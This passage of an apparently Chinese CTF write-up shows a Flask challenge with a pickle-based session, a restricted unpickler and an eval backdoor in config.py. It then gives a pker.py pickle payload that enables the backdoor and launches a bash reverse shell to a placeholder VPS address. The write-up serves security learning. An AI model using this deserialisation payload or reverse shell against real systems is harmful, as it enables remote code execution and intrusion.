&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">config&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">cdll&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">LoadLibrary&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;./readflag.so&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Flask&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">config&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">update&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">dict&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">Unpickler&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;config&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#d88200">&amp;#34;__&amp;#34;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">getattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">modules&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">],&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">UnpicklingError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global &amp;#39;&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">.&lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#39; is forbidden&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;Helper function analogous to pickle.loads().&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">RestrictedUnpickler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">io&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">BytesIO&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">))&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">load&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/index&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">index&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">None&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;index.html&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/login&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">methods&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">login&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;username&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">form&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;test&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">user&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">User&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">redirect&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url_for&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/home&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">home&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">session&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;info&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">User&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">restricted_loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">base64&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">b64decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">info&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Jpg_id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">random&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">randint&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">render_template&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;home.html&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">id&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Jpg_id&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">info&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">User&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">route&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/images&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">images&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;wget&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">getlist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;argv&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">x&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">startswith&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#d88200">&amp;#39;--&amp;#39;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">x&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">x&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">image&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">request&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;image&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">true_argv&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">extend&lt;/span>&lt;span style="color:#111">([&lt;/span>&lt;span style="color:#d88200">&amp;#34;-q&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-O&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;-&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;http://127.0.0.1:8080/&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">image&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">image_data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stdout&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">stderr&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">subprocess&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">PIPE&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">image_data&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">stdout&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">debug&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">True&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">80&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># config.py&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">SECRET_KEY&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;On_You_fffffinddddd_thi3_kkkkkkeeEEy&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">{&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>&lt;span style="color:#d88200">&amp;#34;no&amp;#34;&lt;/span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">user&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">data&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">username&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">data&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">backdoor&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">list&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">notadmin&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">==&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">eval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>这里的限制挺简单的了，覆盖一个notadmin字典admin键的值为yes即可执行给出的后门函数&lt;code>eval()&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># 用pker.py生成payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;notadmin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;yes&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;user&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">user&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;tyskill&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">door&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;config&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;backdoor&amp;#34;&lt;/span>&lt;span style="color:#111">,[&lt;/span>&lt;span style="color:#d88200">&amp;#34;__import__(&amp;#39;subprocess&amp;#39;).call(&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">echo -e &amp;#39;#!/bin/bash&lt;/span>&lt;span style="color:#8045ff">\\&lt;/span>&lt;span style="color:#d88200">nsh -i &amp;gt;&amp;amp; /dev/tcp/you_vps_ip/port 0&amp;gt;&amp;amp;1&amp;#39;&amp;gt;x &amp;amp;&amp;amp; bash x &amp;amp;&amp;amp; rm -rf x&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">,shell=True)&amp;#34;&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">user&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>然后&lt;code>base64.b64encode(data)&lt;/code>加进&lt;code>session['info']&lt;/code>中拿到shell&lt;/p>
